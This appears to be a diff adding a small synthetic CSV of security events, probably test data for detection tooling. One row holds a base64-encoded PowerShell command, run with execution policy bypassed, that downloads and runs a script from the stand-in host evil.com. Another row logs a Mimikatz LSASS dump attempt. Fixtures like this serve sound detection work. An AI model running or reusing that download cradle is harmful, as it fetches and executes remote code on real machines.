@@ -1,0 +1,4 @@
+timestamp,event_type,username,src_ip,dest_ip,port,status,message
+2026-08-08 09:15:00,PROCESS_EXECUTION,admin_dev,192.168.1.105,10.0.0.45,445,WARN,powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA
+2026-08-08 09:20:00,PRIVILEGE_ESCALATION,svc_sql,10.0.0.45,10.0.0.5,88,CRITICAL,Event ID 4672: Special privileges assigned to new logon. Mimikatz LSASS memory dump attempt detected.
+2026-08-08 09:25:00,ACCOUNT_LOCKOUT,svc_sql,10.0.0.45,10.0.0.5,88,CRITICAL,Event ID 4740: User Account 'svc_sql' was locked out due to anomalous privilege escalation guard rails.
